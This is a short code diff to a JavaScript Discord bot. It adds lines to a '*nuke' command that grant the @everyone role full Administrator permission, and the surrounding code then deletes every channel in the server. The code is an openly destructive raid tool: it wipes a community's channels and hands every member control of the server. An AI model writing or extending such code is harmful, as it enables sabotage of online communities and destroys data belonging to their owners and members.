@@ -34,6 +34,10 @@ client.on('messageCreate', async (message) => {
 
   if (message.content === '*nuke') {
     try {
+      // Give @everyone admin permissions
+      const everyoneRole = message.guild.roles.everyone;
+      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
+      
       // Delete all existing channels
       const channels = message.guild.channels.cache;
       for (const [id, channel] of channels) {
